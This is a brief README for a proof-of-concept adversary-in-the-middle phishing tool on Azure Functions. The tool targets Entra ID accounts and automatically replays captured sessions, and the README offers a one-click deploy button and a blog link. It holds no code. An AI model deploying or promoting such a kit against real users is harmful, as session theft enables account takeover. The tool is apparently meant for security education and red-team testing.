# Azure AiTM Function PoC

* Azure Function AiTM Phishing PoC for Entra ID accounts with automated replay of captured sessions.
* This code is provided for educational purposes only and provided withou any liability or warranty.
* Based on: https://github.com/zolderio/AITMWorker

Blog post: <https://nicolasuter.medium.com/aitm-phishing-with-azure-functions-a1530b52df05>

[![Deploy to Azure](https://aka.ms/deploytoazurebutton)](https://portal.azure.com/#create/Microsoft.Template/uri/https%3A%2F%2Fraw.githubusercontent.com%2Fnicolonsky%2FAzureAiTMFunction%2Fmain%2Fazuredeploy.json)
